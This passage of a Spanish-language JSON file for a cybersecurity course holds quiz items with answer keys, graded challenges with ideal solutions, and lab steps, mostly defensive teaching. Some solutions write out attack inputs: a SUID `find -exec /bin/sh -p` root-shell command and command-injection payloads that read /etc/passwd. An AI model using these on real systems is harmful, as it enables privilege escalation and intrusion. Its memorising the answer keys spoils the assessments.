      "answer": 1,
      "explanation": "Las System Calls son la interfaz estandarizada mediante la cual las aplicaciones en Userland solicitan operaciones privilegiadas al Kernel."
    },
    {
      "id": "q-08",
      "moduleId": "mod-04",
      "category": "Linux",
      "difficulty": "Básica",
      "question": "En permisos de Linux, ¿qué valor octal representa el permiso de Lectura (r), Escritura (w) y Ejecución (x) completo?",
      "options": [
        "5",
        "6",
        "7",
        "4"
      ],
      "answer": 2,
      "explanation": "Lectura = 4, Escritura = 2, Ejecución = 1. La suma 4 + 2 + 1 = 7 representa el acceso completo (rwx)."
    },
    {
      "id": "q-09",
      "moduleId": "mod-04",
      "category": "Linux",
      "difficulty": "Intermedia",
      "question": "¿Qué comando de Linux te permite buscar todos los archivos en el sistema que tengan activado el bit SUID?",
      "options": [
        "find / -perm -4000 2>/dev/null",
        "ls -la / --suid",
        "grep -r 'suid' /etc/",
        "chmod +s /"
      ],
      "answer": 0,
      "explanation": "`find / -perm -4000` busca en todo el sistema los archivos con el bit SUID activo (permiso de ejecución con privilegios del propietario del archivo)."
    },
    {
      "id": "q-10",
      "moduleId": "mod-04",
      "category": "Linux",
      "difficulty": "Básica",
      "question": "¿En qué archivo de Linux se almacenan los hashes de las contraseñas de los usuarios del sistema?",
      "options": [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/security",
        "/var/log/auth.log"
      ],
      "answer": 1,
      "explanation": "El archivo `/etc/shadow` contiene los hashes de contraseñas y parámetros de expiración de credenciales, accesible exclusivamente por root."
    },
    {
      "id": "q-11",
      "moduleId": "mod-05",
      "category": "Windows",
      "difficulty": "Intermedia",
      "question": "Un atacante busca lograr persistencia en Windows agregando una clave en el Registro. ¿Cuál de las siguientes colmenas se refiere a la configuración específica del usuario en sesión?",
      "options": [
        "HKLM (HKEY_LOCAL_MACHINE)",
        "HKCU (HKEY_CURRENT_USER)",
        "HKCR (HKEY_CLASSES_ROOT)",
        "HKCC (HKEY_CURRENT_CONFIG)"
      ],
      "answer": 1,
      "explanation": "HKCU almacena la configuración y perfiles del usuario que tiene iniciada la sesión actualmente en la máquina."
    },
    {
      "id": "q-12",
      "moduleId": "mod-05",
      "category": "Windows",
      "difficulty": "Básica",
      "question": "¿Qué herramienta nativa de Windows se utiliza para auditar e inspeccionar los eventos de seguridad y registros del sistema?",
      "options": [
        "Event Viewer (eventvwr.msc)",
        "Registry Editor (regedit)",
        "Task Manager",
        "Disk Management"
      ],
      "answer": 0,
      "explanation": "El Visor de Eventos (Event Viewer) permite consultar los logs de aplicación, seguridad, sistema y registros detallados como Sysmon."
    },
    {
      "id": "q-13",
      "moduleId": "mod-06",
      "category": "Redes",
      "difficulty": "Básica",
      "question": "¿Cuál es la secuencia correcta de banderas en el handshake de 3 vías de TCP para establecer una conexión?",
      "options": [
        "ACK → SYN → SYN-ACK",
        "SYN → SYN-ACK → ACK",
        "SYN → ACK → FIN",
        "CONNECT → ACCEPT → OK"
      ],
      "answer": 1,
      "explanation": "El protocolo TCP establece conexiones seguras enviando un SYN desde el cliente, un SYN-ACK desde el servidor y finalmente un ACK desde el cliente."
    },
    {
      "id": "q-14",
      "moduleId": "mod-06",
      "category": "Redes",
      "difficulty": "Intermedia",
      "question": "¿Cuántas direcciones IP utilizables para hosts ofrece una subred con máscara `/28`?",
      "options": [
        "16",
        "14",
        "30",
        "64"
      ],
      "answer": 1,
      "explanation": "Un `/28` asigna 4 bits para hosts (2^4 = 16 direcciones totales). Descontando la dirección de Red y la de Broadcast, quedan 14 IPs utilizables."
    },
    {
      "id": "q-15",
      "moduleId": "mod-06",
      "category": "Redes",
      "difficulty": "Intermedia",
      "question": "¿Qué protocolo se encarga de resolver una dirección IP conocida a su correspondiente dirección MAC física en una red local?",
      "options": [
        "DNS",
        "DHCP",
        "ARP",
        "ICMP"
      ],
      "answer": 2,
      "explanation": "ARP (Address Resolution Protocol) mapea direcciones de capa de red (IP) a direcciones de capa de enlace de datos (MAC) dentro de la misma subred local."
    },
    {
      "id": "q-16",
      "moduleId": "mod-07",
      "category": "Internet",
      "difficulty": "Básica",
      "question": "¿En qué puerto estándar escucha de forma predeterminada un servidor web un tráfico cifrado HTTPS?",
      "options": [
        "80",
        "8080",
        "443",
        "22"
      ],
      "answer": 2,
      "explanation": "El puerto 443 es el puerto estándar estandarizado para las comunicaciones cifradas mediante HTTPS (HTTP sobre TLS/SSL)."
    },
    {
      "id": "q-17",
      "moduleId": "mod-07",
      "category": "Internet",
      "difficulty": "Avanzada",
      "question": "En el protocolo DNS, ¿qué tipo de registro mapea un nombre de dominio a una dirección IPv4?",
      "options": [
        "Registro AAAA",
        "Registro A",
        "Registro MX",
        "Registro TXT"
      ],
      "answer": 1,
      "explanation": "El Registro A asigna un nombre de dominio a una dirección IPv4 de 32 bits (mientras que el AAAA asigna IPv6)."
    },
    {
      "id": "q-18",
      "moduleId": "mod-08",
      "category": "Programación",
      "difficulty": "Intermedia",
      "question": "En un script de Python enfocado a ciberseguridad, ¿qué librería estándar se utiliza para crear sockets TCP/UDP y establecer conexiones de red?",
      "options": [
        "requests",
        "socket",
        "sys",
        "re"
      ],
      "answer": 1,
      "explanation": "La librería `socket` proporciona acceso directo a la interfaz de conectividad de red del sistema operativo."
    },
    {
      "id": "q-19",
      "moduleId": "mod-09",
      "category": "Seguridad",
      "difficulty": "Básica",
      "question": "¿Qué significa el concepto de 'Superficie de Ataque' en bastionado de sistemas (Hardening)?",
      "options": [
        "El número de monitores conectados al servidor",
        "La suma de todos los puntos de entrada expuestos donde un atacante podría intentar vulnerar el sistema",
        "El ancho de banda total de la tarjeta de red",
        "El tamaño en disco del sistema operativo"
      ],
      "answer": 1,
      "explanation": "La superficie de ataque abarca todos los puertos abiertos, servicios activos, aplicaciones expuestas y cuentas de usuario que representan vectores potenciales de explotación."
    },
    {
      "id": "q-20",
      "moduleId": "mod-09",
      "category": "Seguridad",
      "difficulty": "Intermedia",
      "question": "¿Cuál es la diferencia entre autenticación y autorización?",
      "options": [
        "Autenticación verifica QUIÉN eres; Autorización determina QUÉ tienes permitido hacer",
        "Autenticación encripta archivos; Autorización los borra",
        "Autenticación es para redes; Autorización es para procesadores",
        "Son exactamente lo mismo"
      ],
      "answer": 0,
      "explanation": "Autenticación valida la identidad (ej. ingresar tu contraseña e OTP), mientras que Autorización verifica si esa identidad posee permisos para acceder a un recurso determinado."
    },
    {
      "id": "q-21",
      "moduleId": "mod-10",
      "category": "Laboratorios",
      "difficulty": "Intermedia",
      "question": "Durante un análisis de capturas de tráfico con Wireshark, ¿qué filtro te permite mostrar únicamente peticiones HTTP de tipo POST?",
      "options": [
        "http.post",
        "http.request.method == 'POST'",
        "tcp.port == 80 && post",
        "ip.src == post"
      ],
      "answer": 1,
      "explanation": "El filtro de despliegue `http.request.method == 'POST'` aísla las peticiones donde se envían datos hacia el servidor web."
    },
    {
      "id": "q-22",
      "moduleId": "mod-01",
      "category": "Fundamentos",
      "difficulty": "Avanzada",
      "question": "¿Qué es un indicador de compromiso (IOC - Indicator of Compromise)?",
      "options": [
        "Un documento legal que firma un auditor",
        "Un artefacto forense observatorio en la red o sistema que indica una intrusión con alta probabilidad",
        "Un parche emitido por Microsoft",
        "La velocidad de procesamiento del procesador"
      ],
      "answer": 1,
      "explanation": "Un IOC es una evidencia forense (hash de malware, dirección IP maliciosa, regla de registro) que demuestra la presencia de una amenaza en un sistema."
    },
    {
      "id": "q-23",
      "moduleId": "mod-06",
      "category": "Redes",
      "difficulty": "Avanzada",
      "question": "¿Cuál es la función del campo TTL (Time to Live) en la cabecera del protocolo IP?",
      "options": [
        "Indicar la hora exacta de creación del paquete",
        "Evitar que los paquetes circulen indefinidamente en la red reduciéndose en 1 en cada salto de router",
        "Calcular la velocidad de conexión en Mbps",
        "Cifrar el contenido del paquete"
      ],
      "answer": 1,
      "explanation": "El TTL es un contador que se decrementa en 1 por cada router transitado. Si llega a 0, el paquete se descarta enviando un mensaje ICMP Time Exceeded."
    },
    {
      "id": "q-24",
      "moduleId": "mod-04",
      "category": "Linux",
      "difficulty": "Avanzada",
      "question": "¿Qué efecto produce otorgar el permiso especial `SUID` (chmod u+s) a un archivo ejecutable en Linux?",
      "options": [
        "Hace que el archivo se borre automáticamente tras ejecutarse",
        "Permite que el ejecutable se corra con los privilegios del usuario propietario del archivo, no del usuario que lo ejecuta",
        "Cifra el código ejecutable para evitar ingeniería inversa",
        "Bloquea el acceso al archivo en red"
      ],
      "answer": 1,
      "explanation": "El bit SUID hace que el binario se ejecute con los permisos de su dueño (si el dueño es root, se ejecutará con privilegios administrativos)."
    },
    {
      "id": "q-25",
      "moduleId": "mod-07",
      "category": "Internet",
      "difficulty": "Intermedia",
      "question": "¿Qué vulnerabilidad aprovecha un atacante mediante la suplantación de respuesta DNS para redirigir a una víctima a una página de phishing?",
      "options": [
        "SQL Injection",
        "DNS Cache Poisoning (Envenenamiento de DNS)",
        "Buffer Overflow",
        "Cross-Site Scripting"
      ],
      "answer": 1,
      "explanation": "El envenenamiento de caché DNS inyecta direcciones IP falsas en las tablas del resolver DNS para desviar a los usuarios a servidores maliciosos."
    },
    {
      "id": "q-26",
      "moduleId": "mod-05",
      "category": "Windows",
      "difficulty": "Experta",
      "question": "¿Qué ID de evento en el registro de auditoría de Windows representa la creación de un nuevo proceso (Process Creation)?",
      "options": [
        "Event ID 4624",
        "Event ID 4688",
        "Event ID 1102",
        "Event ID 4720"
      ],
      "answer": 1,
      "explanation": "El Event ID 4688 en el log de auditoría de seguridad de Windows registra cada vez que un proceso es creado en el sistema."
    },
    {
      "id": "q-27",
      "moduleId": "mod-08",
      "category": "Programación",
      "difficulty": "Avanzada",
      "question": "¿Qué diferencia existe entre un ataque de 'Port Scanning' de tipo SYN (Half-Open) y un escaneo TCP Connect completo?",
      "options": [
        "SYN scan no completa el 3-Way Handshake (envía RST tras recibir SYN-ACK), siendo más rápido y menos propenso a registrarse en aplicación",
        "TCP Connect no requiere paquetes IP",
        "SYN Scan solo funciona en Windows",
        "Son exactamente idénticos"
      ],
      "answer": 0,
      "explanation": "El SYN scan de media apertura interrumpe la conexión inmediatamente enviando un RST al recibir SYN-ACK, sin finalizar la conexión de capa 7."
    },
    {
      "id": "q-28",
      "moduleId": "mod-09",
      "category": "Seguridad",
      "difficulty": "Avanzada",
      "question": "¿Qué es una función Hash criptográfica (como SHA-256) y qué propiedad clave posee?",
      "options": [
        "Es un algoritmo reversible para comprimir texto",
        "Es una función unidireccional que convierte una entrada de cualquier tamaño en una salida de tamaño fijo, siendo computacionalmente inviable revertirla",
        "Es una clave privada para cifrado asimétrico",
        "Es un protocolo de enrutamiento"
      ],
      "answer": 1,
      "explanation": "Las funciones hash son deterministas y unidireccionales: cualquier cambio mínimo en la entrada altera drásticamente el resultado (efecto avalancha) y no se pueden revertir."
    },
    {
      "id": "q-29",
      "moduleId": "mod-10",
      "category": "Laboratorios",
      "difficulty": "Experta",
      "question": "Al investigar un incidente forense en memoria RAM de Windows, ¿qué herramienta de código abierto se utiliza ampliamente para extraer estructuras de procesos, hilos y conexiones?",
      "options": [
        "Nmap",
        "Volatility Framework",
        "Wireshark",
        "Metasploit"
      ],
      "answer": 1,
      "explanation": "Volatility es la suite estándar de la industria para el análisis forense avanzado de volcado de memoria (RAM dumps)."
    },
    {
      "id": "q-30",
      "moduleId": "mod-06",
      "category": "Redes",
      "difficulty": "Experta",
      "question": "¿Qué mecanismo utiliza ICMP Redirect y por qué representa un riesgo potencial en redes locales sin controles?",
      "options": [
        "Asigna IPs dinámicas a clientes",
        "Notifica a un host sobre una mejor ruta para un destino; si es falsificado por un atacante, permite realizar ataques Man-in-the-Middle (MitM)",
        "Cifra el tráfico entre switches",
        "Realiza backups de la tabla de enrutamiento"
      ],
      "answer": 1,
      "explanation": "Si un atacante envía mensajes ICMP Redirect falsos, puede modificar la tabla de enrutamiento del host víctima para canalizar su tráfico por su propia máquina."
    }
  ],
  "challenges": [
    {
      "id": "challenge-01",
      "title": "Análisis del Viaje DNS completo",
      "category": "Internet & Redes",
      "difficulty": "Intermedio",
      "xp": 100,
      "description": "Explica de forma estructurada paso a paso qué sucede desde que un usuario escribe 'https://cyberlab.edu' en la barra de direcciones hasta que la página se renderiza en la pantalla.",
      "prompt": "Tu respuesta debe detallar: 1. Caché del navegador y SO, 2. Consulta al Resolver DNS, 3. Handshake TCP (banderas), 4. Negociación TLS/SSL (certificados y claves de sesión), 5. Petición HTTP GET y respuesta.",
      "hints": [
        "Recuerda incluir los puertos involucrados (53, 443).",
        "Menciona el cifrado simétrico generado durante el TLS Handshake."
      ],
      "idealSolution": "1. El navegador consulta la caché local -> archivo hosts -> resolver DNS local. Si no está en caché, consulta a servidores Raíz (Root), TLD (.edu) y Autoritativo hasta obtener la IP.\n2. Con la IP obtenida, el cliente inicia un TCP 3-Way Handshake (SYN -> SYN-ACK -> ACK) al puerto 443 del servidor.\n3. Inicia el TLS Handshake: Cliente envía Client Hello (cifrados soportados) -> Servidor responde Server Hello con su Certificado Digital X.509 -> Se verifica la CA y se intercambian premaster secrets para derivar una clave simétrica de sesión.\n4. El cliente envía la petición HTTP GET / cifrada con la clave simétrica.\n5. El servidor procesa la petición y responde HTTP 200 OK cifrado con el HTML/CSS/JS, el cual es renderizado por el motor del navegador."
    },
    {
      "id": "challenge-02",
      "title": "Investigación de Logs de Autenticación sospechosos",
      "category": "Blue Team & SOC",
      "difficulty": "Avanzado",
      "xp": 150,
      "description": "Analiza las siguientes líneas de log de un servidor Linux `/var/log/auth.log` e identifica el patrón de ataque, la IP atacante y el usuario comprometido.",
      "prompt": "Log extract:\n`Oct 12 14:01:02 server sshd[1020]: Failed password for invalid user admin from 192.168.1.105 port 45220 ssh2`\n`Oct 12 14:01:04 server sshd[1022]: Failed password for invalid user root from 192.168.1.105 port 45222 ssh2`\n`Oct 12 14:01:06 server sshd[1024]: Failed password for user dicson from 192.168.1.105 port 45224 ssh2`\n`Oct 12 14:01:08 server sshd[1026]: Accepted password for user dicson from 192.168.1.105 port 45226 ssh2`",
      "hints": [
        "Observa la alta frecuencia de intentos fallidos en intervalos de 2 segundos.",
        "Busca el mensaje 'Accepted password'."
      ],
      "idealSolution": "Ataque identificado: Fuerza Bruta SSH (Brute Force Attack).\nIP atacante: 192.168.1.105.\nUsuario comprometido: dicson.\nAnálisis: La IP realizó múltiples intentos fallidos consecutivos contra usuarios comunes (admin, root, dicson) en intervalos de 2 segundos hasta encontrar la contraseña correcta para el usuario 'dicson' a las 14:01:08.\nAcciones recomendadas: Bloquear la IP 192.168.1.105 en el firewall, cambiar la contraseña de dicson e implementar Fail2Ban y autenticación por clave SSH con MFA."
    },
    {
      "id": "challenge-03",
      "title": "Cálculo de Subredes para un Departamento de Seguridad",
      "category": "Redes",
      "difficulty": "Intermedio",
      "xp": 100,
      "description": "Tu empresa te solicita asignar un segmento de red seguro para 25 servidores de análisis forense partiendo de la red privada 172.16.0.0/24.",
      "prompt": "Determina: 1. La máscara CIDR requerida, 2. La máscara en notación decimal, 3. La dirección de red asignada, 4. La IP de Broadcast y 5. El rango de IPs asignables.",
      "hints": [
        "Para 25 hosts necesitas al menos 27 direcciones en la potencia de 2 más cercana."
      ],
      "idealSolution": "1. Máscara CIDR: /27 (2^5 = 32 direcciones totales, 30 utilizables, suficiente para 25 hosts).\n2. Máscara decimal: 255.255.255.224.\n3. Dirección de Red: 172.16.0.0/27.\n4. Dirección de Broadcast: 172.16.0.31.\n5. Rango utilizable: 172.16.0.1 a 172.16.0.30."
    },
    {
      "id": "challenge-04",
      "title": "Auditoría de Permisos SUID en Linux",
      "category": "Linux Hardening",
      "difficulty": "Avanzado",
      "xp": 150,
      "description": "Al auditor la configuración de un servidor de producción se encuentra que el binario `/usr/bin/find` tiene asignados los permisos `-rwsr-xr-x root root`.",
      "prompt": "Explica por qué esta configuración representa un riesgo crítico de Escalada de Privilegios y cómo un usuario no privilegiado podría obtener una shell de root.",
      "hints": [
        "Revisa GTFOBins para la herramienta `find` con bandera `-exec`."
      ],
      "idealSolution": "Riesgo Crítico: La letra 's' en los permisos de usuario indica que el bit SUID está activo y el propietario es 'root'. Esto significa que cualquier usuario del sistema que ejecute `find` lo ejecutará con privilegios root absolutos.\nExplotación: Un usuario común puede ejecutar `/usr/bin/find . -exec /bin/sh -p \\;` para desovar una shell interactiva con UID 0 (root).\nRemediación: Eliminar el bit SUID ejecutando `chmod u-s /usr/bin/find`."
    },
    {
      "id": "challenge-05",
      "title": "Desglose de Hash y Salting",
      "category": "Criptografía & Seguridad",
      "difficulty": "Intermedio",
      "xp": 120,
      "description": "Explica por qué almacenar contraseñas usando únicamente `SHA-256(password)` es inseguro y qué beneficio aporta el uso de 'Salt' y algoritmos de estiramiento de clave como bcrypt o Argon2.",
      "prompt": "Detalla las vulnerabilidades asociadas a Tablas Arcoíris (Rainbow Tables) y ataques de diccionario.",
      "hints": [
        "Un Salt es una cadena aleatoria única por usuario.",
        "Los algoritmos de hashing lento consumen tiempo y memoria intencionalmente."
      ],
      "idealSolution": "Inseguridad de SHA-256 directo: Al ser una función extremadamente rápida, un atacante con GPU puede probar miles de millones de hashes por segundo (Ataques de Fuerza Bruta y Diccionario). Además, si dos usuarios usan la misma contraseña, sus hashes son idénticos, permitiendo búsquedas precomputadas en Tablas Arcoíris (Rainbow Tables).\nSolución con Salt: Agregar una cadena aleatoria única (Salt) a cada contraseña antes del hash rompe el uso de Tablas Arcoíris precalculadas.\nSolución con bcrypt/Argon2: Incorporan un factor de costo (Work Factor/Memory Hardness) que ralentiza deliberadamente el cálculo del hash, haciendo inviables los ataques masivos por fuerza bruta."
    },
    {
      "id": "challenge-06",
      "title": "Detección de Inyección de Comandos en Web",
      "category": "Seguridad Web",
      "difficulty": "Avanzado",
      "xp": 150,
      "description": "Un formulario web en Python ejecuta internamente: `os.system('ping -c 1 ' + user_input)`.",
      "prompt": "Muestra un payload de prueba para confirmar la vulnerabilidad de Command Injection y explica la remediación adecuada.",
      "hints": [
        "Utiliza separadores de comandos en Bash como `;` o `&&`."
      ],
      "idealSolution": "Payload de prueba: `127.0.0.1; id` o `8.8.8.8 && cat /etc/passwd`.\nEfecto: El sistema operativo ejecutará el comando `ping` y a continuación ejecutará el comando inyectado `id` o `cat /etc/passwd` devolviendo el resultado en la respuesta web.\nRemediación: Evitar el uso de `os.system()` con concatenación de cadenas. Utilizar el módulo `subprocess` pasando los argumentos como una lista sin invocar la shell del sistema (`subprocess.run(['ping', '-c', '1', user_input], shell=False)`), además de validar y sanitizar la entrada mediante listas blancas."
    },
    {
      "id": "challenge-07",
      "title": "Identificación de artefactos en el Registro de Windows",
      "category": "Forense Digital",
      "difficulty": "Avanzado",
      "xp": 160,
      "description": "Durante la investigación de un incidente en un equipo Windows 11, encuentras la clave `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater` apuntando a `C:\\Users\\Public\\update.exe`.",
      "prompt": "Explica la técnica MITRE ATT&CK correspondiente, su objetivo y los pasos para analizar el binario de forma aislada.",
      "hints": [
        "Revisa la técnica T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys)."
      ],
      "idealSolution": "Técnica MITRE: T1547.001 (Registry Run Keys / Startup Folder).\nObjetivo: Persistencia (Persistence). Garantizar la ejecución automática del código malicioso cada vez que el usuario inicie sesión.\nPasos de análisis aislado:\n1. Extraer una copia del binario `update.exe` de forma segura sin ejecutarlo.\n2. Calcular sus hashes cryptographicos (MD5, SHA-256) y consultarlos en VirusTotal.\n3. Montar una máquina virtual aislada (Sandbox sin conectividad a red de producción).\n4. Realizar análisis estático (extraer strings con `strings.exe`, analizar cabecera PE con PE-bear) y análisis dinámico con Procmon, Regshot y Wireshark."
    },
    {
      "id": "challenge-08",
      "title": "Diseño de Regla de Detección Sigma/YARA Básica",
      "category": "SOC & Detección",
      "difficulty": "Experto",
      "xp": 200,
      "description": "Crea la lógica conceptual para una regla de alerta que detecte la ejecución del proceso `powershell.exe` cuando contiene en su línea de comandos el argumento `-EncodedCommand` o `-e` seguido de cadenas Base64.",
      "prompt": "Especifica el campo de evento (ej. Process CommandLine), la condición de coincidencia y la severidad asignada.",
      "hints": [
        "Los atacantes usan -EncodedCommand para ofuscar scripts en PowerShell."
      ],
      "idealSolution": "Lógica de Detección:\nRegla: Detección de PowerShell con Comandos Ofuscados (Base64).\nCampo de evento: Image / OriginalFileName == 'powershell.exe' Y CommandLine contiene (' -EncodedCommand ', ' -enc ', ' -e ')\nSeveridad: Alta (High).\nExplicación: El parámetro `-EncodedCommand` acepta una cadena codificada en Unicode Base64. Aunque puede usarse en administración legítima, es altamente frecuente en ataques de descarga y ejecución de cargas útiles (Malware Stagers). La alerta debe desovar una investigación para decodificar la cadena Base64 y verificar su contenido."
    },
    {
      "id": "challenge-09",
      "title": "Análisis de Cabeceras HTTP de Seguridad",
      "category": "Seguridad Web",
      "difficulty": "Intermedio",
      "xp": 110,
      "description": "Se audita un sitio web bancario y se observa la falta de la cabecera `Strict-Transport-Security` (HSTS) y `Content-Security-Policy` (CSP).",
      "prompt": "Explica a qué riesgos expone a los usuarios la ausencia de estas dos cabeceras y qué valores recomiendas implementar.",
      "hints": [
        "HSTS fuerza HTTPS.",
        "CSP previene la ejecución de scripts maliciosos de terceros (XSS)."
      ],
      "idealSolution": "Ausencia de HSTS (Strict-Transport-Security): Expone a los usuarios a ataques de degradación de SSL (SSL Strip) y Man-in-the-Middle donde un atacante intercepta la primera petición HTTP antes de redirigir a HTTPS.\nValor recomendado: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`.\nAusencia de CSP (Content-Security-Policy): Deja la aplicación vulnerable a ataques Cross-Site Scripting (XSS), permitiendo la ejecución de scripts maliciosos inyectados de cualquier origen.\nValor recomendado: Configurar una política CSP restrictiva declarando orígenes de confianza (`default-src 'self'; script-src 'self' https://trusted.cdn.com`)."
    },
    {
      "id": "challenge-10",
      "title": "Simulación de Respuesta ante Incidente Ransomware",
      "category": "Incident Response",
      "difficulty": "Experto",
      "xp": 220,
      "description": "El SOC recibe una alerta a las 03:00 AM: Múltiples servidores de archivos están renombrando documentos con la extensión `.locked` y creando archivos `READ_ME.txt`.",
      "prompt": "Ordena cronológicamente las primeras 4 acciones de contención e investigación inmediata que debe realizar el equipo de respuesta a incidentes.",
      "hints": [
        "La contención física/red es la prioridad #1 ante un brote activo."
      ],
      "idealSolution": "1. Contención Inmediata de Red: Aislar físicamente o deshabilitar los puertos de red/VLAN de los servidores afectados para detener la propagación lateral a través de SMB/Active Directory.\n2. Preservación de Evidencia: Extraer volcados de memoria RAM (RAM Dumps) de equipos afectados donde los procesos de cifrado sigan activos para intentar recuperar claves en memoria.\n3. Identificación del Vector de Entrada e Identidad Compromedida: Analizar logs de VPN, RDP y controladores de dominio para revocar credenciales asociadas al acceso inicial.\n4. Verificación de Respaldos: Confirmar el estado de inmutabilidad y aislamiento de los respaldos de seguridad (Backups Offline 3-2-1) antes de iniciar cualquier procedimiento de restauración."
    }
  ],
  "labs": [
    {
      "id": "lab-001",
      "number": "Lab 001",
      "title": "Análisis de Tráfico de Red con Wireshark / tcpdump",
      "category": "Redes & Análisis",
      "difficulty": "Principiante",
      "xp": 150,
      "objective": "Aprender a capturar y analizar paquetes de red en un entorno de laboratorio simulado para identificar la estructura del Handshake TCP y credenciales transmitidas en texto claro.",
      "prerequisites": [
        "mod-06",
        "mod-07"
      ],
      "preparation": "Este laboratorio se realiza en un entorno virtual aislado utilizando herramientas estándar de captura. No requiere acceso a internet exterior.",
      "steps": [
        {
          "step": 1,
          "title": "Inicialización de la Captura de Red",
          "command": "sudo tcpdump -i eth0 -w laboratorio_red.pcap",
          "description": "Inicia una captura de tráfico completa en el adaptador virtual `eth0` y guarda los paquetes en el archivo binario `laboratorio_red.pcap`."
        },
        {
          "step": 2,
          "title": "Generación de Tráfico de Prueba",
          "command": "curl -X POST -d 'user=admin&pass=Secret123' http://127.0.0.1:8080/login",
          "description": "Simula el envío de un formulario de inicio de sesión no cifrado (HTTP) hacia un servidor local en el puerto 8080."
        },
        {
          "step": 3,
          "title": "Filtrado de Paquetes en Wireshark",
          "command": "http.request.method == 'POST'",
          "description": "Abre el archivo `laboratorio_red.pcap` en Wireshark y aplica el filtro para aislar la petición HTTP POST enviada."
        },
        {
          "step": 4,
          "title": "Inspección de Carga Útil (Payload)",
          "command": "Follow -> TCP Stream",
          "description": "Haz clic derecho sobre el paquete filtrado y selecciona 'Follow TCP Stream' para reconstruir la conversación completa entre cliente y servidor."
        }
      ],
      "questions": [
        {
          "id": "l1-q1",
          "question": "¿En qué campo de la cabecera HTTP se observan las credenciales enviadas?",
          "options": [
            "En las cabeceras HTTP Server",
            "En el cuerpo de la petición (HTML Form Data)",
            "En la dirección MAC de origen",
            "En el parámetro TTL"
          ],
          "answer": 1
        },
        {
          "id": "l1-q2",
          "question": "¿Por qué fue posible leer la contraseña 'Secret123' directamente en la captura?",
          "options": [
            "Porque Wireshark la desencriptó automáticamente",
            "Porque el protocolo HTTP transmite datos en texto claro sin cifrado TLS",
            "Porque el puerto 8080 es siempre cifrado",
            "Porque se utilizó una dirección IP privada"
          ],
          "answer": 1
        }
      ],
      "solution": "La captura revela que la transmisión de datos sensibles mediante HTTP plano expone credenciales a cualquier observador en la red (Man-in-the-Middle).",
      "mitigation": "Migrar todos los servicios web a HTTPS imponiendo TLS 1.3 y configurar cabeceras HSTS para forzar conexiones cifradas."
    },
    {
      "id": "lab-002",
      "number": "Lab 002",
      "title": "Hardening y Permisos en Servidores Linux",
      "category": "Linux & Hardening",
      "difficulty": "Principiante",
      "xp": 160,
      "objective": "Auditar la configuración de archivos críticos del sistema en Linux, detectar permisos peligrosos y aplicar el principio de mínimo privilegio.",
      "prerequisites": [
        "mod-04"
      ],
      "preparation": "Entorno virtual Linux con usuario no privilegiado y acceso a `sudo`.",
      "steps": [
        {
          "step": 1,
          "title": "Auditoría de Archivos Sensibles",
          "command": "ls -l /etc/passwd /etc/shadow",
          "description": "Verifica los permisos actuales de los archivos de cuentas de usuario y hashes de contraseñas."
        },
        {
          "step": 2,
          "title": "Búsqueda de Binarios SUID Peligrosos",
          "command": "find / -perm -4000 2>/dev/null",
          "description": "Escanea el sistema de archivos buscando binarios ejecutables que posean el bit SUID activo."
        },
        {
          "step": 3,
          "title": "Corrección de Permisos Inseguros",
          "command": "sudo chmod 640 /etc/shadow && sudo chown root:shadow /etc/shadow",
          "description": "Aplica los permisos restrictivos correctos (`rw-r-----`) propiedad de `root:shadow`."
        },
        {
          "step": 4,
          "title": "Verificación de Auditoría",
          "command": "ls -l /etc/shadow",
          "description": "Confirma que usuarios no autorizados no tienen acceso de lectura ni escritura al archivo `/etc/shadow`."
        }
      ],
      "questions": [
        {
          "id": "l2-q1",
          "question": "¿Qué permisos numéricos corresponden a la configuración recomendada `rw-r-----` para `/etc/shadow`?",
          "options": [
            "755",
            "640",
            "777",
            "600"
          ],
          "answer": 1
        }
      ],
      "solution": "El bastionado exitoso del archivo `/etc/shadow` impidió la extracción no autorizada de hashes de contraseñas.",
      "mitigation": "Establecer revisiones periódicas de integridad con AIDE o Tripwire y automatizar la comprobación de compliance."
    },
    {
      "id": "lab-003",
      "number": "Lab 003",
      "title": "Análisis de Persistencia en el Registro de Windows",
      "category": "Windows & Forense",
      "difficulty": "Intermedio",
      "xp": 180,
      "objective": "Investigar claves del Registro de Windows utilizadas por malware para establecer persistencia y automatizar la limpieza segura.",
      "prerequisites": [
        "mod-05"
      ],
      "preparation": "Entorno de pruebas Windows con PowerShell iniciado con permisos de Administrador.",
      "steps": [
        {
          "step": 1,
          "title": "Inspección de Claves de Inicio Automático",
          "command": "Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
          "description": "Consulta todas las entradas configuradas para ejecutarse al iniciar la sesión del usuario actual."
        },
        {
          "step": 2,
          "title": "Identificación de Entrada Anómala",
          "command": "Get-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
          "description": "Verifica si existen entradas sospechosas que apunten a carpetas temporales o de acceso público como `C:\\Users\\Public` o `C:\\Temp`."
        },
        {
          "step": 3,
          "title": "Eliminación del Valor Malicioso",
          "command": "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SuspiciousApp'",
          "description": "Remueve la clave del registro identificada para neutralizar el mecanismo de persistencia."
        }
      ],
      "questions": [
        {
          "id": "l3-q1",
          "question": "¿Qué evento de Sysmon registra la creación o modificación de claves en el Registro de Windows?",
          "options": [
            "Sysmon Event ID 1 (Process Create)",
            "Sysmon Event ID 13 (RegistryEvent)",
            "Sysmon Event ID 3 (Network Connection)",
            "Sysmon Event ID 7 (Image Loaded)"
          ],
          "answer": 1
        }
      ],
      "solution": "Se detectó y eliminó exitosamente un valor de registro no autorizado sin afectar el funcionamiento del sistema operativo.",
      "mitigation": "Implementar políticas AppLocker/WDAC y limitar los derechos de administración local."
    },
    {
      "id": "lab-004",
      "number": "Lab 004",
      "title": "Creación de un Escáner de Puertos Sencillo en Python",
      "category": "Programación & Pentesting",
      "difficulty": "Intermedio",
      "xp": 200,
      "objective": "Desarrollar un script funcional en Python utilizando sockets para escanear y determinar el estado de puertos de red en localhost.",
      "prerequisites": [
        "mod-08"
      ],
      "preparation": "Entorno local con Python 3 instalado.",
      "steps": [
        {
          "step": 1,
          "title": "Creación del Script Python `port_scanner.py`",
          "command": "nano port_scanner.py",
